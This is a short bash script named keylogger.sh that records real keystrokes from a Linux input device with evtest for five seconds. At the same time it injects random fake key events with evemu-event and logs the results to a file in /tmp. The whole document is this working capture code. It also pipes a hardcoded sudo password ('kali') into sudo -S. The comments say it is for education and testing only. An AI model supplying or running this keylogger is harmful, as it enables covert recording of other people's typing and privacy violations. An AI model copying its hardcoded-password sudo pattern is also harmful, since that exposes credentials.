#!/bin/bash

# -----------------------------------------------------------------------------
# Script Name: keylogger.sh
# Description: This script logs keyboard activity from an input device and 
#              generates fake keystrokes concurrently for a specified duration.
#              It uses `evtest` to capture real keystrokes and `evemu-event` 
#              to simulate fake keystrokes.
#
# Usage: 
#   1. Ensure you have the necessary permissions to access input devices.
#   2. Install `evtest` and `evemu-tools` if not already installed.
#   3. Run the script with appropriate privileges (e.g., using sudo).
#
# Features:
#   - Detects the first available keyboard input device.
#   - Logs real keystrokes to a temporary log file.
#   - Simulates random fake keystrokes concurrently.
#   - Cleans up any remaining processes after execution.
#
# Requirements:
#   - `evtest` and `evemu-tools` must be installed.
#   - Sudo privileges are required to access input devices and execute commands.
#
# Variables:
#   LOG_FILE: Path to the temporary log file where keyboard activity is logged.
#   DEVICE:   Path to the detected keyboard input device.
#   RANDOM_KEYS: Array of possible key events to simulate.
#
# Functions:
#   generate_fake_keystrokes(device_path):
#       Generates and logs fake keystrokes using `evemu-event` for a duration 
#       of 5 seconds. Sends key down and key up events with random intervals.
#
# Execution Flow:
#   1. Detect the keyboard input device.
#   2. Start generating fake keystrokes in the background.
#   3. Log real keystrokes using `evtest` for 5 seconds.
#   4. Wait for the fake keystroke generation process to finish.
#   5. Clean up any remaining `evemu-event` processes.
#   6. Display the contents of the log file.
#
# Note:
#   - This script is intended for educational and testing purposes only.
#   - Unauthorized use of this script may violate privacy and security policies.
# -----------------------------------------------------------------------------

LOG_FILE="/tmp/keyboard_log.txt"
> "$LOG_FILE"

# Find the keyboard input device
DEVICE=$(ls /dev/input/event* | grep -i 'event' | head -n 1)

# Check if the device is found
if [ -z "$DEVICE" ]; then
    echo "No input devices found."
    exit 1
fi

# List of possible random key events
RANDOM_KEYS=("KEY_A" "KEY_B" "KEY_C" "KEY_D" "KEY_E" "KEY_F" "KEY_G" 
             "KEY_H" "KEY_I" "KEY_J" "KEY_K" "KEY_L" "KEY_M" "KEY_N" 
             "KEY_O" "KEY_P" "KEY_Q" "KEY_R" "KEY_S" "KEY_T" "KEY_U" 
             "KEY_V" "KEY_W" "KEY_X" "KEY_Y" "KEY_Z" "KEY_SPACE" "KEY_ENTER" "KEY_BACKSPACE" "KEY_TAB")

# Function to generate and log fake keystrokes concurrently using evemu-event
generate_fake_keystrokes() {
    local device_path="$1"
    end_time=$((SECONDS + 5))
    while [ $SECONDS -lt $end_time ]; do
        random_key=${RANDOM_KEYS[$RANDOM % ${#RANDOM_KEYS[@]}]}
        
        # Send the key down event (value 1)
        sudo evemu-event "$device_path" --type EV_KEY --code "$random_key" --value 1 &
        evemu_pid=$!
        
        # Send the key up event (value 0) after a brief delay to ensure release is processed
        sleep 0.05
        sudo evemu-event "$device_path" --type EV_KEY --code "$random_key" --value 0 &
        
        # Sleep for a random interval between 0.2 and 0.5 seconds
        sleep "$(awk -v min=0.2 -v max=0.5 'BEGIN{srand(); print min+rand()*(max-min)}')"
    done
}

# Start fake keystroke generation in the background
generate_fake_keystrokes "$DEVICE" &

fake_keystrokes_pid=$!

# Run evtest and log real keystrokes
echo "Logging keyboard activity from device $DEVICE for 5 seconds..."
echo "kali" | sudo -S timeout 5 evtest "$DEVICE" | grep -oP "EV_KEY.*" | while read -r line; do
    echo "$(date) - $line" >> "$LOG_FILE"
done

# Wait for the background process to finish
wait $fake_keystrokes_pid

# Kill any remaining evemu-event processes (if any)
echo "Cleaning up remaining evemu-event processes..."
pkill -f "evemu-event"

# Display the contents of the log file
echo "Log file contents:"
cat "$LOG_FILE"
